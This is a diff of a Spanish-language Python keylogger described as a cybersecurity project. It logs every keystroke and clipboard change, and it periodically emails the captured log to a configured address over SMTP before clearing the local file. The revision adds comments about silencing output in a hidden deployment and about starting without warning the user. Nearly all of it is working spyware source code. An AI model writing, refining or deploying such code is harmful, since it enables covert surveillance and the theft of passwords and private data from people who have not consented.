@@ -1,13 +1,12 @@
 # -*- coding: utf-8 -*-
 
 """
-Keylogger avanzado para proyecto de ciberseguridad.
+Keylogger con funciones avanzadas para investigaciones de ciberseguridad.
 
-Este script implementa varias de las funcionalidades como
+Este script implementa varias funcionalidades como
 captura de teclas, monitoreo del portapapeles y exfiltración de datos por email.
 """
-
-# Importaciones de librerías estándar y de terceros
+#----- INICIO DE IMPORTACIONES -----
 import os
 import threading
 import time
@@ -15,39 +14,38 @@ import logging
 import configparser
 from datetime import datetime
 import sys
-
-# pynput para la captura de teclado
-from pynput import keyboard
-
-# pyperclip para el monitoreo del portapapeles
-try:
-    import pyperclip
-except ImportError:
-    print("[ADVERTENCIA] La librería 'pyperclip' no está instalada. El monitoreo del portapapeles no funcionará.")
-    print("Para instalarla, ejecuta: pip install pyperclip")
-    pyperclip = None
-
-# smtplib para el envío de correos electrónicos
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-class Keylogger:
-    #Clase principal que encapsula toda la lógica del Keylogger.
-    #Es modular, configurable y extensible.    
+# NOTA: En un despliegue real/oculto, los siguientes prints (import pynput / import pyperclip) deberían reemplazarse 
+# por logs internos o simplemente silenciarse para no alertar al usuario
+try:
+    from pynput import keyboard
+except ImportError:
+    print("[ADVERTENCIA] La librería 'pynput' no está instalada. El script no funcionará.")
+    print("[ADVERTENCIA] Para instalar dependencias, ejecuta: 'pip install -r requirements.txt'")
+    sys.exit(1)
 
-    def __init__(self, config_file='config.ini', stop_keys=None):
-        #Inicializa el Keylogger cargando la configuración y preparando el logging.
-        
-        # --- 1. Carga de Configuración ---
+# NOTA: Requiere tener instalado 'xclip' o 'xsel' en el sistema (sudo apt install xclip)
+try:
+    import pyperclip
+except ImportError:
+    print("[ADVERTENCIA] La librería 'pyperclip' no está instalada. El monitoreo del portapapeles estara desactivado.")
+    print("[ADVERTENCIA] Para instalar dependencias, ejecuta: 'pip install -r requirements.txt'")
+    pyperclip = None
+#----- FIN DE IMPORTACIONES -----
+
+
+class Keylogger:
+    def __init__(self, config_file='config.ini'):      
+        # Carga de Configuración
         self.config = configparser.ConfigParser()
         if not os.path.exists(config_file):
-            raise FileNotFoundError(f"El archivo de configuración '{config_file}' no se encontró. Por favor, créalo.")
+            raise FileNotFoundError(f"El archivo de configuración '{config_file}' no se encontró.")
         self.config.read(config_file)
 
-        # --- 2. Configuración del Logging ---
-        # En lugar de escribir directamente a un archivo, usamos el módulo 'logging'
-        # que es más robusto y profesional.
+        # Configuración del Logging
         log_filename = self.config.get('General', 'log_file', fallback='keylog.txt')
         logging.basicConfig(
             filename=log_filename,
@@ -56,138 +54,125 @@ class Keylogger:
         )
         self.logger = logging.getLogger(__name__)
 
-        # --- 3. Atributos y Estado Interno ---
-        self.stop_keys = stop_keys if stop_keys else [keyboard.Key.esc]
+        # Sistema de parada del script
+        self.current_keys = set()
+        # Paramos script con: Ctrl(Izq) + Alt(Izq) + S
+        self.stop_combination = {
+            keyboard.Key.ctrl_l, 
+            keyboard.Key.alt_l, 
+            keyboard.KeyCode(char='s')
+        }
+
         self.last_clipboard_content = ""
-
-        # --- 4. Configuración del reporte por email ---
         self.reporting_interval = self.config.getint('General', 'report_interval_seconds', fallback=300)
-
-        # Determinar el sistema operativo
+        self.timer = None
         self.os_type = self._detect_os()
 
     def _detect_os(self):
-        """
-        Detecta el sistema operativo y devuelve 'Linux' o 'Windows'.
-        """
-        if sys.platform.startswith('win'):
-            return 'Windows'
-        elif sys.platform.startswith('linux'):
+        # Detección del SO
+        if sys.platform.startswith('linux'):
             return 'Linux'
-        else:
-            return 'Unknown'
+        print(f"[ERROR DE SO] Sistema operativo no soportado: {sys.platform}")
+        print("f[ERROR DE SO] Este keyloogger ha sido diseñado exclusivamente para Linux")
+        sys.exit(1)
 
     def _on_press(self, key):
-        """
-        Callback que se ejecuta cada vez que una tecla es presionada.
-        Registra la tecla en el archivo de log.
-        """
+        self.current_keys.add(key)
+        # Verificación parada de emergencia
+        if self.stop_combination.issubset(self.current_keys):
+            self.logger.warning("--- COMBINACIÓN DE PARADA DETECTADA (Ctrl+Alt+S) ---")
+            self.logger.warning("--- DETENIENDO PROCESOS ---")
+            
+            if self.timer:
+                self.timer.cancel()
+            return False
+
+        # Registro de teclas alfanuméricas y especiales
         try:
-            # Si es una tecla alfanumérica, la registramos como tal
             self.logger.info(f"Tecla presionada: {key.char}")
         except AttributeError:
-            # Si es una tecla especial (Shift, Ctrl, etc.), la registramos con su nombre
             self.logger.info(f"Tecla especial presionada: {key}")
 
     def _on_release(self, key):
-        """
-        Callback que se ejecuta cuando una tecla es liberada.
-        Comprueba si es la tecla de parada de emergencia.
-        """
-        if key in self.stop_keys:
-            self.logger.warning("--- Captura finalizada por el usuario (Ctrl + Shift + Esc) ---")
-            # Devuelve False para detener el listener de pynput
-            return False
+        # Al soltar una tecla, la sacamos del conjunto
+        try:
+            self.current_keys.remove(key)
+        except KeyError:
+            pass 
 
     def _send_email_report(self):
-        """
-        Implementa la User Story de "exfiltrar los datos".
-        Envía el contenido del log por email y lo limpia.
-        """
+        #Envía el contenido del log por email y lo limpia
         try:
+            if not os.path.exists(self.config.get('General', 'log_file')):
+                return
             with open(self.config.get('General', 'log_file'), 'r', encoding='utf-8') as f:
-                log_content = f.read()
-
+                log_content=f.read()            
             if not log_content.strip():
-                self.logger.info("El archivo de log está vacío.")
                 return
 
-            # Construcción del mensaje de email
+            #Construcción del mensaje de email
             msg = MIMEMultipart()
             msg['From'] = self.config.get('Email', 'sender_email')
             msg['To'] = self.config.get('Email', 'receiver_email')
-            msg['Subject'] = f"--- Reporte de Keylogger --- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            msg['Subject'] = f"--- REPORTE DEL KEYLOGGER --- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
-            body = f"Adjunto se encuentra el registro de actividad:\n\n{log_content}"
+            body = f"Datos capturados:\n\n{log_content}"
             msg.attach(MIMEText(body, 'plain'))
 
-            # Conexión y envío
+            #Conexión y envío
             server = smtplib.SMTP(self.config.get('Email', 'smtp_server'), self.config.getint('Email', 'smtp_port'))
             server.starttls()
             server.login(self.config.get('Email', 'sender_email'), self.config.get('Email', 'sender_password'))
             server.send_message(msg)
             server.quit()
 
-            self.logger.info("Reporte enviado por email exitosamente.")
-
-            # Limpiamos el archivo de log después de enviarlo
+            self.logger.info(f"[EMAIL] Enviado. Bytes: {len(log_content)}")
             open(self.config.get('General', 'log_file'), 'w').close()
 
         except Exception as e:
-            self.logger.error(f"Error al enviar el reporte por email: {e}")
+            self.logger.error(f"[ERROR EMAIL]Fallo al enviar el reporte: {e}")
 
     def _report_periodically(self):
-        #Función que se ejecuta en un hilo para enviar reportes periódicamente.
+        #Hilo para enviar reportes periodicamente
         self._send_email_report()
-        # Volvemos a programar la ejecución de esta misma función en el futuro
-        timer = threading.Timer(self.reporting_interval, self._report_periodically)
-        timer.daemon = True # Permite que el programa principal termine aunque el timer esté activo
-        timer.start()
+        self.timer = threading.Timer(self.reporting_interval, self._report_periodically)
+        self.timer.daemon = True 
+        self.timer.start()
 
     def _monitor_clipboard(self):
-        """
-        Implementa la tarea "Capturación de Portapapeles".
-        Se ejecuta en un hilo separado y revisa cambios en el portapapeles.
-        """
-        if not pyperclip:
-            return # No hacer nada si la librería no está disponible
-
+        #Hilo para revisar cambios en el portapapeles
+        if not pyperclip: return
         while True:
             try:
                 current_clipboard = pyperclip.paste()
                 if current_clipboard != self.last_clipboard_content:
                     self.last_clipboard_content = current_clipboard
-                    self.logger.info(f"ACTUALIZACIÓN DEL PORTAPAPELES: '{current_clipboard}'")
-            except Exception as e:
-                 self.logger.error(f"Error al leer del portapapeles: {e}")
-            time.sleep(2) #Espera 2 segundos antes de volver a comprobar
+                    self.logger.info(f"PORTAPAPELES: '{current_clipboard}'")
+            except Exception:
+                 pass
+            time.sleep(2) #Revisa si hay cambios cada 2seg
 
     def start(self):
         #Inicia todos los componentes del keylogger
-        self.logger.warning("\n--- Iniciando captura de teclado ---")
-        self.logger.info(f"Presiona la combinación de teclas '{', '.join(str(key) for key in self.stop_keys)}' para detener.")
-
-        # Iniciar monitoreo del portapapeles en un hilo separado 
+        self.logger.warning("\n--- KEYLOGGER INICIADO ---")
+        self.logger.info("Usa Ctrl+Alt+S para detener.")
+        # Inicia monitoreo del portapapeles en un hilo separado 
         clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
         clipboard_thread.start()
-
-        #Iniciar el reporte periódico por email
+        #Inicia el reporte periódico por email
         self._report_periodically()
-
-        # Iniciar el listener de teclado (bloquea el hilo principal)
+        # Inicia el listener de teclado (bloquea el hilo principal)
         with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as listener:
             listener.join()
 
 if __name__ == "__main__":
-    stop_keys = [keyboard.Key.ctrl, keyboard.Key.shift, keyboard.Key.esc]
-    if sys.platform.startswith('win'):
-        print("Este keylogger solo está diseñado para ejecutarse en sistemas Linux.")
-        sys.exit(1)
-
     try:
-        keylogger = Keylogger(stop_keys=stop_keys)
+        #Iniciamos sin avisar al usuario
+        keylogger = Keylogger()
         keylogger.start()
     except FileNotFoundError as e:
-        print(f"[ERROR CRÍTICO] {e}")
+        print(f"[ERROR CRÍTICO] Falta configuración: {e}")
+    except KeyboardInterrupt:
+        print("\n[AVISO] Interrupción manual.")
     except Exception as e:
-        print(f"[ERROR INESPERADO] Ocurrió un error: {e}")
+        print(f"[ERROR INESPERADO] {e}")
